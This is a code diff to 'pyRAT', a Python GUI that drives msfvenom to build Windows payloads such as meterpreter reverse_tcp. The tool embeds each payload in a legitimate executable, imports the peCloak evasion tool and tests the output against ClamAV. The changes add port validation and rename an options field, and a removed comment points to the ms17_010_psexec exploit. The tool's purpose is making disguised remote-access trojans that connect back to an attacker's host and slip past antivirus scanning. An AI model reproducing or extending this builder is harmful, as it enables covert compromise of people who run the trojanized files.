@@ -6,12 +6,8 @@ For more info about pyRAT see the 'README.md' file.
 
 import subprocess, sys, os, pyclamd, peCloak
 from Tkinter import *
-from tkMessageBox import askquestion, showerror
 import tkMessageBox
-from Crypto import Random
-from Crypto.Cipher import AES
 from PIL import Image, ImageTk
-
 
 
 def color(text, color_code):
@@ -76,7 +72,7 @@ def showPayloads():
 # Set Payload Options
 def mal(var):
     
-    global payload, ip, top, porta , out, opt
+    global payload, ip, top, porta , out, extra
     rm(fbutton)
     payload = var.get()
     raise_frame(f3)
@@ -90,15 +86,15 @@ def mal(var):
     Label(top, text='Please, insert your local port:').pack()
     porta = Entry(top,width=30, bg="lightblue")
     porta.pack()
-    t = StringVar(top, value="''")
+   
     Label(top, text='Please, insert other options if required:').pack()
-    opt = Entry(top,textvariable=t,width=30, bg="lightblue")
-    opt.pack()
+    extra = Entry(top,width=30, bg="lightblue")
+    extra.pack()
+    
     v = StringVar(top, value='payloads/')
     Label(top, text="Please, insert the file's name: ").pack()
     out = Entry(top,textvariable=v, width=30, bg="lightblue")
     out.pack()
-
     information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()])
     information.pack(side=RIGHT)
     btn = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), gen_msg()])
@@ -146,17 +142,32 @@ def validation():
     
     while True:
       #If LHOST is valid, proceed with the generation of the payload
-      if ipFormatChk(lhost) == True:
+      if ipFormatChk(lhost) == True and portChk() == True:
          generation()
          break
       else:
          tkMessageBox.destroy()
+         
+
+def portChk():
+        global lport
+        lport = porta.get()
+	try:
+	    
+	    if 1 <= int(lport) <= 65535:
+		
+                return True
+	    else:
+		raise ValueError
+	except ValueError:
+            tkMessageBox.showerror("Error", "Invalid port")
+	    return False
 
 # Generate payload              
 def generation():
-    global scan, lport, file_name, options, name, legit_file
-    lport = porta.get()
-    options = opt.get()
+    global scan, file_name, options, name, legit_file
+    opt = extra.get()
+    options = "'" + opt + "'"
     name = out.get()
     file_name = name + ".exe"
 
@@ -164,11 +175,6 @@ def generation():
 # User has to know in advance the required options in order for the payload to be executed successfully :) #
 ############################################################################################################
 
-# This can be done by opening metasploit and seeing the options
-# e.g --> use windows/smb/ms17_010_psexec,
-#         set payload windows/meterpreter/reverse_tcp
-#         show options
- 
     generate_payload = subprocess.Popen(['msfvenom', '-p', payload, lhost, lport, options, '-f', 'exe', '-x', legit_file, '-o', file_name], stdout=subprocess.PIPE).communicate()[0]
     yolo = Label(f3, text='Press the "Scan file for virus" button. It will begin the scanning with ClamAV.')
     yolo.place(x=2,y=5)
